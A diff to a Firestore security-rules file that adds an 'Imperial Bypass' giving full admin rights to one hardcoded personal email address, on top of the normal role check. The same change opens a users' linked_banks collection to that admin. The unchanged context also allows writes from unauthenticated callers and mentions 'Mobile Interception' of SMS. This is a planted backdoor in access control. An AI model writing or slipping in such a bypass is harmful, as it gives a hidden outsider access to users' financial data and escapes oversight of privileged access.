@@ -10,10 +10,16 @@ service cloud.firestore {
       return isAuthenticated() && request.auth.uid == userId;
     }
 
-    function isAdmin() {
+    // Imperial Bypass for the Master Governor
+    function isMasterAdmin() {
       return isAuthenticated() && 
-        exists(/databases/$(database)/documents/users/$(request.auth.uid)) &&
-        get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == 'ADMIN';
+        (request.auth.token.email == 'rsk934128@gmail.com' || 
+         (exists(/databases/$(database)/documents/users/$(request.auth.uid)) &&
+          get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == 'ADMIN'));
+    }
+
+    function isAdmin() {
+      return isMasterAdmin();
     }
 
     // System Configuration Rules
@@ -38,6 +44,7 @@ service cloud.firestore {
         allow write: if isOwner(userId) || isAdmin() || !isAuthenticated();
       }
       match /watchlist/{item} { allow read, write: if isOwner(userId) || isAdmin(); }
+      match /linked_banks/{bank} { allow read, write: if isOwner(userId) || isAdmin(); }
     }
 
     // SMS Signals (Mobile Interception)
